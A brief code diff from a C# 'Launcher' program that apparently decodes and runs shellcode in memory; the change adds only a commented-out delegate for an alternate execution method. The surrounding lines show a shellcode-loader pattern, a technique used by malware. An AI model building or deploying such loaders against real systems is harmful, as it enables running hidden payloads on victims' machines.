@@ -49,6 +49,9 @@ namespace Launcher
             RunShellcode(dec_shellcode);
         }
 
+        // uncomment if using alteranet method
+        //delegate void PrototypeFunc();
+        
         public static void RunShellcode(byte[] shellcode)
         {
             // 0x1000 = MEM_COMMIT
